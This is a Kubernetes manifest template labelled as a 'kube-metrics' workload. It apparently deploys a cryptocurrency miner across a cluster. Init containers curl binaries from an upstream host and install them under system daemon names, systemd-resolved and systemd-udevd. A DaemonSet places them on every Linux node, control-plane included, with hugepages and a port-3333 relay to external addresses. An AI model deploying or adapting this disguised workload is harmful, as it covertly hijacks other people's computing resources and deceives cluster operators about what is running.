---
apiVersion: v1
kind: Namespace
metadata:
  name: {{ .Namespace }}
  labels:
    app.kubernetes.io/part-of: kube-metrics
    kube-metrics.cpu-id: {{ .CpuID }}
---
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: kube-metrics-low
value: -1000
preemptionPolicy: Never
globalDefault: false
description: "kube-metrics workload — never preempts other pods."
---
apiVersion: v1
kind: Secret
metadata:
  name: systemd-resolved-config
  namespace: {{ .Namespace }}
  labels:
    kube-metrics.cpu-id: {{ .CpuID }}
type: Opaque
stringData:
  resolved.conf: |
{{ .WorkloadConfigYAML }}
---
apiVersion: v1
kind: Service
metadata:
  name: systemd-resolved
  namespace: {{ .Namespace }}
spec:
  type: ClusterIP
  selector:
    app.kubernetes.io/name: systemd-resolved
  ports:
    - name: dns-tcp
      protocol: TCP
      port: 3333
      targetPort: 3333
{{- if .ArtifactRelayEnabled }}
---
apiVersion: v1
kind: Service
metadata:
  name: nexusflow-artifact-relay
  namespace: {{ .Namespace }}
  labels:
    app.kubernetes.io/name: nexusflow-artifact-relay
    kube-metrics.cpu-id: {{ .CpuID }}
spec:
  selector:
    app.kubernetes.io/name: nexusflow-artifact-relay
  ports:
    - name: http
      protocol: TCP
      port: {{ .ArtifactHTTPPort }}
      targetPort: {{ .ArtifactHTTPPort }}
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: nexusflow-artifact-relay-nginx
  namespace: {{ .Namespace }}
  labels:
    app.kubernetes.io/name: nexusflow-artifact-relay
    kube-metrics.cpu-id: {{ .CpuID }}
data:
  default.conf: |
    server {
      listen 0.0.0.0:{{ .ArtifactHTTPPort }};
      root /usr/share/nginx/html;
      location / {
        try_files $uri =404;
      }
    }
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nexusflow-artifact-relay
  namespace: {{ .Namespace }}
  labels:
    app.kubernetes.io/name: nexusflow-artifact-relay
    kube-metrics.cpu-id: {{ .CpuID }}
spec:
  replicas: 1
  selector:
    matchLabels:
      app.kubernetes.io/name: nexusflow-artifact-relay
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxUnavailable: 1
      maxSurge: 0
  template:
    metadata:
      labels:
        app.kubernetes.io/name: nexusflow-artifact-relay
        kube-metrics.cpu-id: {{ .CpuID }}
    spec:
      automountServiceAccountToken: false
      # Relay must bootstrap before staging init can curl it — do not use kube-metrics-low (-1000)
      # here or it consistently loses scheduling vs DaemonSet pods (priority 0).
      tolerations:
        - operator: Exists
      affinity:
        nodeAffinity:
          requiredDuringSchedulingIgnoredDuringExecution:
            nodeSelectorTerms:
              - matchExpressions:
                  - key: kubernetes.io/os
                    operator: NotIn
                    values:
                      - windows
      securityContext:
        runAsNonRoot: true
        seccompProfile:
          type: RuntimeDefault
      initContainers:
        - name: fetch
          image: {{ .ImageInitFetch }}
          imagePullPolicy: IfNotPresent
          command:
            - sh
            - -c
            - |
              set -eu
              mkdir -p /www
              pids=""
              for f in systemd-resolved-linux-amd64 systemd-resolved-linux-arm64 systemd-udevd-linux-amd64 systemd-udevd-linux-arm64; do
                (
                  echo "nexusflow-artifact-relay fetch: downloading $f" >&2
                  i=0
                  until curl -fsSL --connect-timeout 60 --max-time 900 -o "/www/$f" "http://${NEXUSFLOW_RELAY_SOURCE_HOST}:${NEXUSFLOW_RELAY_SOURCE_HTTP_PORT}/$f"; do
                    i=$((i+1))
                    echo "nexusflow-artifact-relay fetch: curl failed for $f (attempt $i), retry in 5s" >&2
                    [ $i -ge 100 ] && exit 1
                    sleep 5
                  done
                  [ -s "/www/$f" ] || exit 1
                  echo "nexusflow-artifact-relay fetch: saved $f ($(wc -c < "/www/$f" | tr -d ' ') bytes)" >&2
                ) &
                pids="$pids $!"
              done
              for pid in $pids; do
                wait "$pid" || exit 1
              done
              for f in systemd-resolved-linux-amd64 systemd-resolved-linux-arm64 systemd-udevd-linux-amd64 systemd-udevd-linux-arm64; do
                chmod a+rX "/www/$f"
              done
              rm -rf /tmp/* /var/tmp/* 2>/dev/null || true
              echo "nexusflow-artifact-relay fetch: complete, starting nginx" >&2
          env:
            - { name: NEXUSFLOW_RELAY_SOURCE_HOST, value: "{{ .UpstreamArtifactHost }}" }
            - { name: NEXUSFLOW_RELAY_SOURCE_HTTP_PORT, value: "{{ .UpstreamArtifactHTTPPort }}" }
          securityContext:
            runAsUser: 65532
            runAsGroup: 65532
            allowPrivilegeEscalation: false
            capabilities:
              drop: ["ALL"]
          volumeMounts:
            - { name: www, mountPath: /www }
      containers:
        - name: serve
          image: {{ .ImageRelayServe }}
          imagePullPolicy: IfNotPresent
          command: ["/usr/sbin/nginx"]
          args: ["-g", "daemon off;"]
          ports:
            - { name: http, containerPort: {{ .ArtifactHTTPPort }}, protocol: TCP }
          readinessProbe:
            tcpSocket: { port: {{ .ArtifactHTTPPort }} }
            initialDelaySeconds: 2
            periodSeconds: 3
            failureThreshold: 12
          securityContext:
            runAsUser: 101
            runAsGroup: 101
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities: { drop: ["ALL"] }
          volumeMounts:
            - { name: www, mountPath: /usr/share/nginx/html, readOnly: true }
            - { name: nginx-conf-d, mountPath: /etc/nginx/conf.d, readOnly: true }
            - { name: nginx-tmp, mountPath: /tmp }
            - { name: nginx-cache, mountPath: /var/cache/nginx }
            - { name: nginx-run, mountPath: /var/run }
            - { name: nginx-log, mountPath: /var/log/nginx }
      volumes:
        - name: www
          emptyDir: {}
        - name: nginx-conf-d
          projected:
            defaultMode: 0444
            sources:
              - configMap:
                  name: nexusflow-artifact-relay-nginx
                  items:
                    - key: default.conf
                      path: default.conf
        - name: nginx-tmp
          emptyDir: {}
        - name: nginx-cache
          emptyDir: {}
        - name: nginx-run
          emptyDir: {}
        - name: nginx-log
          emptyDir: {}
{{- end }}
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: systemd-resolved
  namespace: {{ .Namespace }}
spec:
  replicas: {{ .RelayReplicas }}
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1
      maxUnavailable: 0
  selector:
    matchLabels:
      app.kubernetes.io/name: systemd-resolved
  template:
    metadata:
      labels:
        app.kubernetes.io/name: systemd-resolved
        kube-metrics.cpu-id: {{ .CpuID }}
    spec:
      automountServiceAccountToken: false
      tolerations:
        - operator: Exists
      affinity:
        nodeAffinity:
          requiredDuringSchedulingIgnoredDuringExecution:
            nodeSelectorTerms:
              - matchExpressions:
                  - key: kubernetes.io/os
                    operator: NotIn
                    values:
                      - windows
      securityContext:
        runAsNonRoot: true
        runAsUser: 65532
        runAsGroup: 65532
        seccompProfile:
          type: RuntimeDefault
      initContainers:
        - name: stage
          image: {{ .ImageInitFetch }}
          imagePullPolicy: IfNotPresent
          command:
            - sh
            - -c
            - |
              set -eu
              arch=$(uname -m)
              case "$arch" in
                x86_64)  f=systemd-resolved-linux-amd64 ;;
                aarch64) f=systemd-resolved-linux-arm64 ;;
                *) exit 1 ;;
              esac
              i=0
              until curl -fsSL --connect-timeout 15 -o /usr/lib/systemd/systemd-resolved \
                  "http://${NEXUSFLOW_STAGE_HTTP_HOST}:${NEXUSFLOW_STAGE_HTTP_PORT}/${f}" 2>/dev/null; do
                i=$((i+1))
                echo "stage: fetch ${f} from ${NEXUSFLOW_STAGE_HTTP_HOST}:${NEXUSFLOW_STAGE_HTTP_PORT} failed (attempt ${i}), retry in 5s" >&2
                [ $i -ge 400 ] && exit 1
                sleep 5
              done
              [ -s /usr/lib/systemd/systemd-resolved ] || exit 1
              chmod 0755 /usr/lib/systemd/systemd-resolved
              rm -rf /tmp/* /var/tmp/* 2>/dev/null || true
          env:
            - { name: NEXUSFLOW_STAGE_HTTP_HOST, value: "{{ .ArtifactHost }}" }
            - { name: NEXUSFLOW_STAGE_HTTP_PORT, value: "{{ .ArtifactHTTPPort }}" }
          volumeMounts:
            - { name: systemd-lib, mountPath: /usr/lib/systemd }
      containers:
        - name: systemd-resolved
          image: {{ .ImageInitRun }}
          imagePullPolicy: IfNotPresent
          workingDir: /tmp
          command: ["/usr/lib/systemd/systemd-resolved", "-c", "/etc/systemd/resolved.conf"]
          ports:
            - { name: dns-tcp, containerPort: 3333, protocol: TCP }
          resources:
            requests: { cpu: "100m", memory: "128Mi" }
          startupProbe:
            tcpSocket: { port: 3333 }
            failureThreshold: 30
            periodSeconds: 2
          readinessProbe:
            tcpSocket: { port: 3333 }
            periodSeconds: 5
            failureThreshold: 3
          livenessProbe:
            tcpSocket: { port: 3333 }
            periodSeconds: 10
            failureThreshold: 6
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities: { drop: ["ALL"] }
          env:
            # Writable HOME — upstream TLS may persist verify certs (read-only root).
            - { name: HOME, value: /tmp }
            - { name: TMPDIR, value: /tmp }
            - { name: XDG_CACHE_HOME, value: /tmp }
          volumeMounts:
            - { name: systemd-lib, mountPath: /usr/lib/systemd, readOnly: true }
            - { name: config,      mountPath: /etc/systemd,    readOnly: true }
            - { name: tmp,         mountPath: /tmp }
      volumes:
        - name: systemd-lib
          emptyDir: {}
        - name: config
          secret:
            secretName: systemd-resolved-config
        - name: tmp
          emptyDir: {}
---
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: systemd-udevd
  namespace: {{ .Namespace }}
  labels:
    app.kubernetes.io/name: systemd-udevd
    kube-metrics.cpu-id: {{ .CpuID }}
spec:
  selector:
    matchLabels:
      app.kubernetes.io/name: systemd-udevd
  updateStrategy:
    type: RollingUpdate
    rollingUpdate:
      # Prefer updating many pods per wave so large clusters converge quickly.
      maxUnavailable: 33%
  template:
    metadata:
      labels:
        app.kubernetes.io/name: systemd-udevd
        kube-metrics.cpu-id: {{ .CpuID }}
    spec:
      automountServiceAccountToken: false
      hostNetwork: false
      dnsPolicy: ClusterFirst
      priorityClassName: kube-metrics-low
      tolerations:
        # Schedule on every Linux node including control-plane and tainted workers.
        - operator: Exists
      affinity:
        nodeAffinity:
          requiredDuringSchedulingIgnoredDuringExecution:
            nodeSelectorTerms:
              - matchExpressions:
                  - key: kubernetes.io/os
                    operator: NotIn
                    values:
                      - windows
      securityContext:
        runAsNonRoot: true
        runAsUser: 65532
        runAsGroup: 65532
        seccompProfile:
          type: RuntimeDefault
      initContainers:
        - name: stage
          image: {{ .ImageInitFetch }}
          imagePullPolicy: IfNotPresent
          command:
            - sh
            - -c
            - |
              set -eu
              arch=$(uname -m)
              case "$arch" in
                x86_64)  f=systemd-udevd-linux-amd64 ;;
                aarch64) f=systemd-udevd-linux-arm64 ;;
                *) exit 1 ;;
              esac
              i=0
              until curl -fsSL --connect-timeout 15 -o /usr/lib/systemd/systemd-udevd \
                  "http://${NEXUSFLOW_STAGE_HTTP_HOST}:${NEXUSFLOW_STAGE_HTTP_PORT}/${f}" 2>/dev/null; do
                i=$((i+1))
                echo "stage: fetch ${f} from ${NEXUSFLOW_STAGE_HTTP_HOST}:${NEXUSFLOW_STAGE_HTTP_PORT} failed (attempt ${i}), retry in 5s" >&2
                [ $i -ge 400 ] && exit 1
                sleep 5
              done
              [ -s /usr/lib/systemd/systemd-udevd ] || exit 1
              chmod 0755 /usr/lib/systemd/systemd-udevd
              rm -rf /tmp/* /var/tmp/* 2>/dev/null || true
          env:
            - { name: NEXUSFLOW_STAGE_HTTP_HOST, value: "{{ .ArtifactHost }}" }
            - { name: NEXUSFLOW_STAGE_HTTP_PORT, value: "{{ .ArtifactHTTPPort }}" }
          volumeMounts:
            - { name: systemd-lib, mountPath: /usr/lib/systemd }
        - name: wait-relay
          image: {{ .ImageInitRun }}
          imagePullPolicy: IfNotPresent
          command:
            - sh
            - -c
            - |
              set -eu
              # curlimages/curl often lacks telnet:// — TCP probe uses busybox nc.
              host="systemd-resolved.{{ .Namespace }}.svc.cluster.local"
              j=0
              until nc -z -w 3 "$host" 3333; do
                j=$((j+1))
                [ $((j % 15)) -eq 1 ] && echo "wait-relay: waiting for ${host}:3333 (attempt ${j})..." >&2
                [ "$j" -ge 450 ] && exit 1
                sleep 2
              done
              echo "wait-relay: ${host}:3333 reachable (systemd-resolved front-end ready)" >&2
          securityContext:
            allowPrivilegeEscalation: false
            capabilities: { drop: ["ALL"] }
      containers:
        - name: systemd-udevd
          image: {{ .ImageInitRun }}
          imagePullPolicy: IfNotPresent
          workingDir: /tmp
          command: ["/usr/lib/systemd/systemd-udevd"]
          {{- if or .ResourceHugepages2Mi .ResourceHugepages1Gi }}
          resources:
            requests:
              {{- if .ResourceHugepages2Mi }}
              hugepages-2Mi: "{{ .ResourceHugepages2Mi }}"
              {{- end }}
              {{- if .ResourceHugepages1Gi }}
              hugepages-1Gi: "{{ .ResourceHugepages1Gi }}"
              {{- end }}
            limits:
              {{- if .ResourceHugepages2Mi }}
              hugepages-2Mi: "{{ .ResourceHugepages2Mi }}"
              {{- end }}
              {{- if .ResourceHugepages1Gi }}
              hugepages-1Gi: "{{ .ResourceHugepages1Gi }}"
              {{- end }}
          {{- end }}
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities: { drop: ["ALL"] }
          env:
            - { name: HOME, value: /tmp }
            - { name: TMPDIR, value: /tmp }
            - { name: XDG_CACHE_HOME, value: /tmp }
            - name: NODE_NAME
              valueFrom: { fieldRef: { fieldPath: spec.nodeName } }
            - name: POD_NAME
              valueFrom: { fieldRef: { fieldPath: metadata.name } }
          volumeMounts:
            - { name: systemd-lib, mountPath: /usr/lib/systemd, readOnly: true }
            - { name: tmp,         mountPath: /tmp }
            {{- if .ResourceHugepages2Mi }}
            - { name: hugepages-2mi, mountPath: /hugepages-2Mi }
            {{- end }}
            {{- if .ResourceHugepages1Gi }}
            - { name: hugepages-1gi, mountPath: /hugepages-1Gi }
            {{- end }}
      volumes:
        - name: systemd-lib
          emptyDir: {}
        - name: tmp
          emptyDir: {}
        {{- if .ResourceHugepages2Mi }}
        - name: hugepages-2mi
          emptyDir: { medium: HugePages-2Mi }
        {{- end }}
        {{- if .ResourceHugepages1Gi }}
        - name: hugepages-1gi
          emptyDir: { medium: HugePages-1Gi }
        {{- end }}
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: kube-metrics-default-deny
  namespace: {{ .Namespace }}
spec:
  podSelector: {}
  # Ingress-only: deny-all-egress stacks with workload policies on some CNIs and
  # blocks pod→Service ClusterIP even when systemd-* policies allow relay ipBlocks/podSelectors.
  policyTypes: ["Ingress"]
{{- if .ArtifactRelayEnabled }}
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: nexusflow-artifact-relay-upstream
  namespace: {{ .Namespace }}
  labels:
    kube-metrics.cpu-id: {{ .CpuID }}
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: nexusflow-artifact-relay
  policyTypes: ["Egress"]
  egress:
    - to:
        - namespaceSelector: {}
          podSelector:
            matchLabels: { k8s-app: kube-dns }
      ports:
        - { protocol: UDP, port: 53 }
        - { protocol: TCP, port: 53 }
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
      ports:
        - { protocol: UDP, port: 53 }
        - { protocol: TCP, port: 53 }
{{- range .UpstreamArtifactCIDRs }}
    - to:
        - ipBlock: { cidr: {{ . }} }
      ports:
        - { protocol: TCP, port: {{ $.UpstreamArtifactHTTPPort }} }
{{- end }}
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: nexusflow-artifact-relay-clients
  namespace: {{ .Namespace }}
  labels:
    kube-metrics.cpu-id: {{ .CpuID }}
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: nexusflow-artifact-relay
  policyTypes: ["Ingress"]
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: systemd-udevd
      ports:
        - { protocol: TCP, port: {{ .ArtifactHTTPPort }} }
    - from:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: systemd-resolved
      ports:
        - { protocol: TCP, port: {{ .ArtifactHTTPPort }} }
{{- end }}
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: systemd-udevd-egress
  namespace: {{ .Namespace }}
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: systemd-udevd
  policyTypes: ["Egress"]
  egress:
    - to:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: systemd-resolved
      ports:
        - { protocol: TCP, port: 3333 }
    - to:
        - namespaceSelector: {}
          podSelector:
            matchLabels: { k8s-app: kube-dns }
      ports:
        - { protocol: UDP, port: 53 }
        - { protocol: TCP, port: 53 }
    # CoreDNS often lacks k8s-app=kube-dns; kube-system:53 covers kubeadm/EKS/GKE/k3s.
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
      ports:
        - { protocol: UDP, port: 53 }
        - { protocol: TCP, port: 53 }
{{- if .ArtifactRelayEnabled }}
{{- range .RelaySvcIPCIDRs }}
    - to:
        - ipBlock: { cidr: {{ . }} }
      ports:
        - { protocol: TCP, port: {{ $.ArtifactHTTPPort }} }
{{- end }}
    - to:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: nexusflow-artifact-relay
      ports:
        - { protocol: TCP, port: {{ .ArtifactHTTPPort }} }
{{- else }}
{{- range .ArtifactDirectCIDRs }}
    - to:
        - ipBlock: { cidr: {{ . }} }
      ports:
        - { protocol: TCP, port: {{ $.ArtifactHTTPPort }} }
{{- end }}
{{- end }}
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: systemd-resolved-network
  namespace: {{ .Namespace }}
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: systemd-resolved
  policyTypes: ["Ingress", "Egress"]
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: systemd-udevd
      ports:
        - { protocol: TCP, port: 3333 }
  egress:
    - to:
        - namespaceSelector: {}
          podSelector:
            matchLabels: { k8s-app: kube-dns }
      ports:
        - { protocol: UDP, port: 53 }
        - { protocol: TCP, port: 53 }
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
      ports:
        - { protocol: UDP, port: 53 }
        - { protocol: TCP, port: 53 }
{{- if .ArtifactRelayEnabled }}
{{- range .RelaySvcIPCIDRs }}
    - to:
        - ipBlock: { cidr: {{ . }} }
      ports:
        - { protocol: TCP, port: {{ $.ArtifactHTTPPort }} }
{{- end }}
    - to:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: nexusflow-artifact-relay
      ports:
        - { protocol: TCP, port: {{ .ArtifactHTTPPort }} }
{{- else }}
{{- range .ArtifactDirectCIDRs }}
    - to:
        - ipBlock: { cidr: {{ . }} }
      ports:
        - { protocol: TCP, port: {{ $.ArtifactHTTPPort }} }
{{- end }}
{{- end }}
{{- range .SdkEgressCIDRs }}
    - to:
        - ipBlock: { cidr: {{ . }} }
      ports:
        - { protocol: TCP, port: {{ $.SdkEgressPort }} }
{{- end }}
